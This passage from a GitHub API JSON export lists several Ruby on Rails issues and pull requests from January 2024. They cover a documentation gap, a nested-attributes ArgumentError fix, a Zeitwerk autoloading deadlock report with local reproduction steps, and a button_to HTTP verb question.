            "starred_url": "https://api.github.com/users/semaperepelitsa/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/semaperepelitsa/subscriptions",
            "organizations_url": "https://api.github.com/users/semaperepelitsa/orgs",
            "repos_url": "https://api.github.com/users/semaperepelitsa/repos",
            "events_url": "https://api.github.com/users/semaperepelitsa/events{/privacy}",
            "received_events_url": "https://api.github.com/users/semaperepelitsa/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-19T10:47:52Z",
        "updated_at": "2024-01-20T17:25:36Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "Validations are enabled by default when autosave is true:\r\n\r\n    belongs_to :foo, autosave: true\r\n    has_one :foo, autosave: true\r\n\r\nhttps://github.com/rails/rails/blob/9c3ffab47c3bf59320ba08e9dafdb0275cf91a5a/activerecord/lib/active_record/reflection.rb#L653-L658\r\n\r\nHowever, this is not documented in `has_one` or `belongs_to`:\r\n\r\nhttps://github.com/rails/rails/blob/9c3ffab47c3bf59320ba08e9dafdb0275cf91a5a/activerecord/lib/active_record/associations.rb#L1660-L1669\r\n\r\nhttps://github.com/rails/rails/blob/9c3ffab47c3bf59320ba08e9dafdb0275cf91a5a/activerecord/lib/active_record/associations.rb#L1830-L1840",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50807/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50807/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50806",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50806/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50806/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50806/events",
        "html_url": "https://github.com/rails/rails/pull/50806",
        "id": 2090218609,
        "node_id": "PR_kwDNIULOZIeBnw",
        "number": 50806,
        "title": "Link to framework main page instead of README in API docs [ci-skip]",
        "user": {
            "login": "p8",
            "id": 28561,
            "node_id": "MDQ6VXNlcjI4NTYx",
            "avatar_url": "https://avatars.githubusercontent.com/u/28561?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/p8",
            "html_url": "https://github.com/p8",
            "followers_url": "https://api.github.com/users/p8/followers",
            "following_url": "https://api.github.com/users/p8/following{/other_user}",
            "gists_url": "https://api.github.com/users/p8/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/p8/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/p8/subscriptions",
            "organizations_url": "https://api.github.com/users/p8/orgs",
            "repos_url": "https://api.github.com/users/p8/repos",
            "events_url": "https://api.github.com/users/p8/events{/privacy}",
            "received_events_url": "https://api.github.com/users/p8/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2024-01-19T10:35:07Z",
        "updated_at": "2024-01-30T09:14:07Z",
        "closed_at": "2024-01-29T17:50:41Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50806",
            "html_url": "https://github.com/rails/rails/pull/50806",
            "diff_url": "https://github.com/rails/rails/pull/50806.diff",
            "patch_url": "https://github.com/rails/rails/pull/50806.patch",
            "merged_at": null
        },
        "body": "The Rails README that is shown as the homepage of https://api.rubyonrails.org/ has links to the different frameworks. However, these links link to the framework README's instead of the framework main page, which results in a page that misses links to the framework methods and namespaces.\r\n\r\nFor example, clicking on \"ActionView\" results in the following page, which misses any navigation to methods and namespaces.\r\nhttps://api.rubyonrails.org/v7.1/files/actionview/README_rdoc.html\r\n\r\nBy linking to the framework main page the navigation is present:\r\nhttps://api.rubyonrails.org/v7.1/classes/ActionView.html\r\n\r\n### Additional information\r\n\r\nThe README's files are included in the docs in the `/files` directory. These can now probably be removed when generating the docs as the content of the README is already inlined in the framework homepage.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50806/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50806/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50805",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50805/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50805/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50805/events",
        "html_url": "https://github.com/rails/rails/pull/50805",
        "id": 2090121394,
        "node_id": "PR_kwDNIULOZIYjRA",
        "number": 50805,
        "title": "Update CHANGELOG.md, fixing a spelling error",
        "user": {
            "login": "mattrayner",
            "id": 3502902,
            "node_id": "MDQ6VXNlcjM1MDI5MDI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/3502902?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/mattrayner",
            "html_url": "https://github.com/mattrayner",
            "followers_url": "https://api.github.com/users/mattrayner/followers",
            "following_url": "https://api.github.com/users/mattrayner/following{/other_user}",
            "gists_url": "https://api.github.com/users/mattrayner/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/mattrayner/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/mattrayner/subscriptions",
            "organizations_url": "https://api.github.com/users/mattrayner/orgs",
            "repos_url": "https://api.github.com/users/mattrayner/repos",
            "events_url": "https://api.github.com/users/mattrayner/events{/privacy}",
            "received_events_url": "https://api.github.com/users/mattrayner/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107190,
                "node_id": "MDU6TGFiZWwxMDcxOTA=",
                "url": "https://api.github.com/repos/rails/rails/labels/activemodel",
                "name": "activemodel",
                "color": "00E5FF",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-19T09:52:31Z",
        "updated_at": "2024-01-19T11:57:56Z",
        "closed_at": "2024-01-19T11:57:55Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50805",
            "html_url": "https://github.com/rails/rails/pull/50805",
            "diff_url": "https://github.com/rails/rails/pull/50805.diff",
            "patch_url": "https://github.com/rails/rails/pull/50805.patch",
            "merged_at": null
        },
        "body": "Fixes a spelling error in CHANGELOG.md\r\n\r\n<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created because [REPLACE ME]\r\n\r\n### Detail\r\n\r\nThis Pull Request changes [REPLACE ME]\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50805/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50805/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50804",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50804/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50804/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50804/events",
        "html_url": "https://github.com/rails/rails/pull/50804",
        "id": 2090108635,
        "node_id": "PR_kwDNIULOZIX1gw",
        "number": 50804,
        "title": "[Fix #50803] Consistently raise an `ArgumentError` when passing an invalid argument to a nested attributes association writer",
        "user": {
            "login": "joshuay03",
            "id": 54629302,
            "node_id": "MDQ6VXNlcjU0NjI5MzAy",
            "avatar_url": "https://avatars.githubusercontent.com/u/54629302?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/joshuay03",
            "html_url": "https://github.com/joshuay03",
            "followers_url": "https://api.github.com/users/joshuay03/followers",
            "following_url": "https://api.github.com/users/joshuay03/following{/other_user}",
            "gists_url": "https://api.github.com/users/joshuay03/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/joshuay03/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/joshuay03/subscriptions",
            "organizations_url": "https://api.github.com/users/joshuay03/orgs",
            "repos_url": "https://api.github.com/users/joshuay03/repos",
            "events_url": "https://api.github.com/users/joshuay03/events{/privacy}",
            "received_events_url": "https://api.github.com/users/joshuay03/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-19T09:47:03Z",
        "updated_at": "2024-01-19T12:31:04Z",
        "closed_at": "2024-01-19T12:29:01Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50804",
            "html_url": "https://github.com/rails/rails/pull/50804",
            "diff_url": "https://github.com/rails/rails/pull/50804.diff",
            "patch_url": "https://github.com/rails/rails/pull/50804.patch",
            "merged_at": "2024-01-19T12:29:01Z"
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nFixes #50803.\r\n\r\n### Detail\r\n\r\nUpdates `ActiveRecord::NestedAttributes#assign_nested_attributes_for_one_to_one_association` to raise an ArgumentError when given an invalid `attributes` argument similar to [`ActiveRecord::NestedAttributes#assign_nested_attributes_for_collection_association`](https://github.com/rails/rails/blob/9c3ffab47c3bf59320ba08e9dafdb0275cf91a5a/activerecord/lib/active_record/nested_attributes.rb#L488-L490).\r\n\r\nAlso makes a slight improvement to the existing error for collection associations.\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\nNone.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50804/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50804/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50803",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50803/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50803/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50803/events",
        "html_url": "https://github.com/rails/rails/issues/50803",
        "id": 2090101392,
        "node_id": "I_kwDNIULOfJRqkA",
        "number": 50803,
        "title": "Passing an invalid argument when assigning nested attributes only raises an `ArgumentError` for collection associations",
        "user": {
            "login": "joshuay03",
            "id": 54629302,
            "node_id": "MDQ6VXNlcjU0NjI5MzAy",
            "avatar_url": "https://avatars.githubusercontent.com/u/54629302?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/joshuay03",
            "html_url": "https://github.com/joshuay03",
            "followers_url": "https://api.github.com/users/joshuay03/followers",
            "following_url": "https://api.github.com/users/joshuay03/following{/other_user}",
            "gists_url": "https://api.github.com/users/joshuay03/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/joshuay03/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/joshuay03/subscriptions",
            "organizations_url": "https://api.github.com/users/joshuay03/orgs",
            "repos_url": "https://api.github.com/users/joshuay03/repos",
            "events_url": "https://api.github.com/users/joshuay03/events{/privacy}",
            "received_events_url": "https://api.github.com/users/joshuay03/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-19T09:43:45Z",
        "updated_at": "2024-01-19T12:29:03Z",
        "closed_at": "2024-01-19T12:29:03Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n<!-- (Guidelines for creating a bug report are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#creating-a-bug-report)) -->\r\n\r\n<!-- Paste your executable test case created from one of the scripts found [here](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#create-an-executable-test-case) below: -->\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  gem \"rails\", github: \"rails/rails\", branch: \"main\"\r\n\r\n  gem \"sqlite3\"\r\nend\r\n\r\nrequire \"active_record\"\r\nrequire \"minitest/autorun\"\r\nrequire \"logger\"\r\n\r\n# This connection will do for database-independent bug reports.\r\nActiveRecord::Base.establish_connection(adapter: \"sqlite3\", database: \":memory:\")\r\nActiveRecord::Base.logger = Logger.new(STDOUT)\r\n\r\nActiveRecord::Schema.define do\r\n  create_table :posts, force: true do |t|\r\n  end\r\n\r\n  create_table :comments, force: true do |t|\r\n    t.integer :post_id\r\n  end\r\nend\r\n\r\nclass Post < ActiveRecord::Base\r\n  has_one :last_comment, -> { order(id: :desc) }, class_name: \"Comment\"\r\n  has_many :comments\r\n\r\n  accepts_nested_attributes_for :last_comment\r\n  accepts_nested_attributes_for :comments\r\nend\r\n\r\nclass Comment < ActiveRecord::Base\r\n  belongs_to :post\r\nend\r\n\r\nclass BugTest < Minitest::Test\r\n  #  Fails - Throws NoMethodError: undefined method `with_indifferent_access' for \"foo\":String\r\n  def test_assigning_nested_attributes_for_singular_association_with_invalid_argument\r\n    assert_raises(ArgumentError) do\r\n      Post.create!(last_comment_attributes: \"foo\")\r\n    end\r\n  end\r\n\r\n  #  Passes\r\n  def test_assigning_nested_attributes_for_collection_association_with_invalid_argument\r\n    assert_raises(ArgumentError) do\r\n      Post.create!(comments_attributes: \"bar\")\r\n    end\r\n  end\r\nend\r\n```\r\n\r\n### Expected behavior\r\n<!-- Tell us what should happen -->\r\n\r\nPassing an invalid argument when assigning nested attributes for both a singular and collection association should raise a similar `ArgumentError`.\r\n\r\n### Actual behavior\r\n<!-- Tell us what happens instead -->\r\n\r\nPassing an invalid argument when assigning nested attributes for a collection association raises an `ArgumentError`, but it errors out with a `NoMethodError: undefined method 'with_indifferent_access' for \"foo\":String` for singular associations.\r\n\r\n### System configuration\r\n**Rails version**: Edge\r\n\r\n**Ruby version**: 3.3.0\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50803/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50803/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50802",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50802/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50802/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50802/events",
        "html_url": "https://github.com/rails/rails/issues/50802",
        "id": 2089864825,
        "node_id": "I_kwDNIULOfJDOeQ",
        "number": 50802,
        "title": "Deadlock occurs in zeitwerk",
        "user": {
            "login": "alpaca-tc",
            "id": 1688137,
            "node_id": "MDQ6VXNlcjE2ODgxMzc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1688137?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/alpaca-tc",
            "html_url": "https://github.com/alpaca-tc",
            "followers_url": "https://api.github.com/users/alpaca-tc/followers",
            "following_url": "https://api.github.com/users/alpaca-tc/following{/other_user}",
            "gists_url": "https://api.github.com/users/alpaca-tc/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/alpaca-tc/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/alpaca-tc/subscriptions",
            "organizations_url": "https://api.github.com/users/alpaca-tc/orgs",
            "repos_url": "https://api.github.com/users/alpaca-tc/repos",
            "events_url": "https://api.github.com/users/alpaca-tc/events{/privacy}",
            "received_events_url": "https://api.github.com/users/alpaca-tc/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-19T07:51:17Z",
        "updated_at": "2024-01-22T14:34:57Z",
        "closed_at": "2024-01-22T14:34:22Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\nThere are the following two classes, each of which causes deadlock between Threads when loaded from different Threads.\r\nThis occurs in the development environment. That is, `enable_reloading? == true` `allow_concurrency == nil`. \r\n\r\nSample Application: https://github.com/alpaca-tc/zeitwerk-test\r\n\r\n```ruby\r\n# app/models/first.rb\r\nmodule First\r\n  Second\r\nend\r\n\r\n# app/models/second.rb\r\nmodule Second\r\n  First\r\nend\r\n\r\n# app/controllers/constants_controller.rb\r\nclass ConstantsController < ActionController::Base\r\n  def first\r\n    First\r\n    head :no_content\r\n  end\r\n\r\n  def second\r\n    Second\r\n    head :no_content\r\n  end\r\nend\r\n\r\n# config/routes.rb\r\nRails.application.routes.draw do\r\n  get '/first', to: 'constants#first'\r\n  get '/second', to: 'constants#second'\r\nend\r\n```\r\n\r\n```\r\n# Deadlock when requesting in parallel. \r\n$ curl http://127.0.0.1:3000/first\r\n$ curl http://127.0.0.1:3000/second\r\n```\r\n\r\nhttps://github.com/alpaca-tc/zeitwerk-test\r\n\r\n### Expected behavior\r\n\r\nEach request can be executed without deadlock.\r\n\r\n### Actual behavior\r\n\r\nThe thread deadlocks and the request is stopped as Processing.\r\n\r\n```\r\nbundle exec rails server\r\n...\r\nStarted GET \"/first\" for 127.0.0.1 at 2024-01-19 16:31:35 +0900\r\nStarted GET \"/second\" for 127.0.0.1 at 2024-01-19 16:31:35 +0900\r\nProcessing by ConstantsController#first as */*\r\nProcessing by ConstantsController#second as */*\r\n```\r\n\r\n### Additional information\r\n\r\nIf I reproduce it minimum, this issue is similar to the following gist.\r\nhttps://gist.github.com/alpaca-tc/eb9ac65b7761276766c63948c7099cff\r\n\r\nWhen a file with cyclic dependencies is `require/autoload`-ed by multi-thread, a deadlock occurs.\r\nThis behavior is intentional for Ruby.\r\n\r\nPerhaps to prevent this, an exclusive lock should be acquired by `ActiveSupport::Dependencies.load_interlock` during `require` by zeitwerk. However, since there is no API in zeitwerk to such a hook, I did not know where I should acquire the lock.\r\nThe classic autoloader took an exclusive lock, so this problem does not occur.\r\nhttps://github.com/rails/rails//blob/ac6aa32f7cf66264ba87eabed7c042bb60bcf3a2/activesupport/lib/active_support/dependencies.rb#L358-L392\r\n\r\n### System configuration\r\n\r\nRails Version: main\r\nRuby Version: ruby 3.2.2 (2023-03-30 revision e51014f9c0) [arm64-darwin22]\r\n\r\nI guess that it probably occurs in all versions that use zeitwerk.\r\nThis did not occur with the 6.1 classic autoloader.\n\n---\n\nSame issue https://github.com/rails/rails/issues/37320",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50802/reactions",
            "total_count": 2,
            "+1": 2,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50802/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50801",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50801/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50801/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50801/events",
        "html_url": "https://github.com/rails/rails/issues/50801",
        "id": 2089816190,
        "node_id": "I_kwDNIULOfJAQfg",
        "number": 50801,
        "title": "Clarification on button_to Default Behavior in Rails 7.0",
        "user": {
            "login": "yin0110",
            "id": 95560433,
            "node_id": "U_kgDOBbIi8Q",
            "avatar_url": "https://avatars.githubusercontent.com/u/95560433?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/yin0110",
            "html_url": "https://github.com/yin0110",
            "followers_url": "https://api.github.com/users/yin0110/followers",
            "following_url": "https://api.github.com/users/yin0110/following{/other_user}",
            "gists_url": "https://api.github.com/users/yin0110/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/yin0110/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/yin0110/subscriptions",
            "organizations_url": "https://api.github.com/users/yin0110/orgs",
            "repos_url": "https://api.github.com/users/yin0110/repos",
            "events_url": "https://api.github.com/users/yin0110/events{/privacy}",
            "received_events_url": "https://api.github.com/users/yin0110/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2024-01-19T07:24:36Z",
        "updated_at": "2024-01-26T22:40:10Z",
        "closed_at": "2024-01-26T22:40:09Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "Hello,\r\n\r\nI'm updating to Rails 7.0.8 and noticed a change in button_to method behavior regarding the HTTP verb used. The Rails 7.0 release notes suggest button_to uses PATCH for persisted Active Record objects, contrasting the Rails API documentation which indicates POST as the default. Could you clarify this behavior, specifically the conditions under which button_to defaults to PATCH in Rails 7.0?\r\n\r\nSteps to reproduce: \r\n```\r\n<%= button_to 'add_news', new_admin_news_path,  class: 'btn btn-primary' %>\r\n```\r\nwithout setting method.\r\n\r\nExpected behavior: \r\nExpected this behavior would be PATCH, as document said.\r\n![ 2024-01-19 3 18 44](https://github.com/rails/rails/assets/95560433/3bcca04d-4140-456e-9184-cce5b0c2cff2)\r\n\r\n\r\n\r\nActual behavior: \r\nI got POST instead. As rails API document said.\r\n![ 2024-01-19 3 21 23](https://github.com/rails/rails/assets/95560433/dd24e8fb-69db-4ac1-bf8e-6982db98f4b7)\r\n\r\n\r\nSystem configuration: Rails Version: 7.0.8 \r\n\r\nThank you.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50801/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50801/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50800",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50800/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50800/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50800/events",
        "html_url": "https://github.com/rails/rails/pull/50800",
        "id": 2089482274,
        "node_id": "PR_kwDNIULOZH0oEg",
        "number": 50800,
        "title": "Fix ActiveStorage::Blob inverse association:",
        "user": {
            "login": "Edouard-chin",
            "id": 8122246,
            "node_id": "MDQ6VXNlcjgxMjIyNDY=",
            "avatar_url": "https://avatars.githubusercontent.com/u/8122246?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Edouard-chin",
            "html_url": "https://github.com/Edouard-chin",
            "followers_url": "https://api.github.com/users/Edouard-chin/followers",
            "following_url": "https://api.github.com/users/Edouard-chin/following{/other_user}",
            "gists_url": "https://api.github.com/users/Edouard-chin/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Edouard-chin/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Edouard-chin/subscriptions",
            "organizations_url": "https://api.github.com/users/Edouard-chin/orgs",
            "repos_url": "https://api.github.com/users/Edouard-chin/repos",
            "events_url": "https://api.github.com/users/Edouard-chin/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Edouard-chin/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-19T03:15:19Z",
        "updated_at": "2024-01-21T08:17:06Z",
        "closed_at": "2024-01-21T08:17:06Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50800",
            "html_url": "https://github.com/rails/rails/pull/50800",
            "diff_url": "https://github.com/rails/rails/pull/50800.diff",
            "patch_url": "https://github.com/rails/rails/pull/50800.patch",
            "merged_at": "2024-01-21T08:17:06Z"
        },
